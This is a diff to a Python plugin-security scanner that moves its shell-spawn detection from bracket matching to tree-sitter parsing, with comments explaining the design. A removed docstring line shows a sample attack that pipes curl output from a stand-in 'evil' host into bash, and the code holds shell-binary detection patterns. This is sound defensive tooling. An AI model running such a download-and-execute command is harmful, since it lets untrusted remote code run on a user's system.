@@ -21,7 +21,7 @@ SERVER_INJECT = {"tools", "settings", "llm"}
 CLIENT_INJECT = {"settingsScope", "slots", "locale", "agent", "storage",
                  "connection", "conversation", "modelSelection", "ui"}
 OSV_URL = "https://api.osv.dev/v1/query"
-__version__ = "0.1.5"
+__version__ = "0.1.6"
 
 # ─────────────────────────── 包名解析 ───────────────────────────
 def parse_pkg(s):
@@ -553,18 +553,48 @@ def _call_args(src, start):
 def _shell_host_argv_line(src):
     """spawn/execFile 调 shell 本体、且参数里出现联网/管道执行 token 时的行号。
 
-    为什么不单看程序名:Windows 上插件用 powershell/cmd 做本地查询是常见写法,一律报就是误报
-    (实测 11 个真实插件因此多出 1 条)。加上"参数里有没有危险 token"这个条件后:
-      spawn('bash', ['-c', 'curl http://evil/x|sh'])      → 报
-      spawnSync('powershell', ['-Command', 'Get-Process …']) → 不报
-    已知边界:无网络的纯破坏性命令(rm -rf 之类)不会被这条抓到 —— 与本工具"主打外传/窃密/投毒"
-    的既有取向一致。
+    用 tree-sitter 取调用的 arguments 节点范围,而不是自己数括号:手写配对会把字符串里的
+    括号也算成结构括号,于是诱饵字符串(如 "echo ]]")能让参数区间提前截断,把后面的
+    curl 留在区间外。真解析器对字符串/模板/注释/正则天然正确,这一类缺口随之消失。
+
+    为什么不能单看程序名:Windows 插件用 powershell 做本地查询(Get-Process)是常见良性写法,
+    一律报就是误报。所以两个条件同时成立才报:程序名是 shell 本体 **且** 参数里有动作类 token。
+    已知边界(设计取舍,非缺陷):变量间接 spawn(B,…)、解释器包裹 spawn("env",["bash",…])、
+    以及无网络的纯破坏性命令都不在覆盖内 —— 与本工具"主打外传/窃密/投毒"的定位一致。
     """
-    NL = chr(10)
-    for m in _re.finditer(_SPAWN_SHELL_HOST, src, _re.I):
-        if _re.search(_SHELL_ARGV_DANGER, _call_args(src, m.start()), _re.I):
-            return src.count(NL, 0, m.start()) + 1
-    return None
+    if not HAVE_TS:
+        # 没有解析器时退回朴素括号配对:可能被诱饵字符串截断,但比整类检查静默失效好
+        NL = chr(10)
+        for m in _re.finditer(_SPAWN_SHELL_HOST, src, _re.I):
+            if _re.search(_SHELL_ARGV_DANGER, _call_args(src, m.start()), _re.I):
+                return src.count(NL, 0, m.start()) + 1
+        return None
+
+    names = {"spawn", "spawnSync", "execFile"}
+    hits = []
+
+    def walk(node):
+        if node.type == "call_expression":
+            fn = node.child_by_field_name("function")
+            args = node.child_by_field_name("arguments")
+            if fn is not None and args is not None:
+                callee = src[fn.start_byte:fn.end_byte].split(".")[-1]
+                if callee in names:
+                    argv = src[args.start_byte:args.end_byte]
+                    if _re.match(r"""\(\s*['"](?:[^'"]*[\\/])?(?:sh|bash|zsh|cmd(?:\.exe)?|powershell|pwsh)(?:\.exe)?\s*['"]""", argv, _re.I) \
+                       and _re.search(_SHELL_ARGV_DANGER, argv, _re.I):
+                        hits.append(node.start_point[0] + 1)
+            for c in node.named_children:
+                walk(c)
+            return
+        for c in node.named_children:
+            walk(c)
+
+    try:
+        walk(_TS_PARSER.parse(src.encode()).root_node)
+    except RecursionError:
+        return None
+    return hits[0] if hits else None
 
 
 def _shell_command_has_net(src):
